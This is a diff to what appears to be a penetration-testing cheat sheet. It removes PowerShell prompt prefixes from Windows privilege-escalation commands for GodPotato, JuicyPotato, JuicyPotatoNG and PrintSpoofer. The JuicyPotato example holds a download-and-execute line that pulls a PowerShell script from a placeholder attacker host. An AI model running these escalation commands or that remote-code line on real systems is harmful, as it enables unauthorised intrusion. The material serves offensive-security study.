@@ -4851,7 +4851,7 @@ setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperd
 > https://github.com/BeichenDream/GodPotato
 
 ```c
-PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
+.\GodPotato-NET4.exe -cmd '<COMMAND>'
 ```
 
 #### Juicy Potato LPE
@@ -4926,7 +4926,7 @@ $RESULT | ogv
 ##### Execution
 
 ```c
-PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
+.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
 #### JuicyPotatoNG LPE
@@ -4934,7 +4934,7 @@ PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p
 > https://github.com/antonioCoco/JuicyPotatoNG
 
 ```c
-PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
 #### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE
@@ -4964,7 +4964,7 @@ $ mysql -u root
 > https://github.com/itm4n/PrintSpoofer
 
 ```c
-PS C:\> .\PrintSpoofer64.exe -i -c powershell
+.\PrintSpoofer64.exe -i -c powershell
 ```
 
 #### SharpEfsPotato LPE
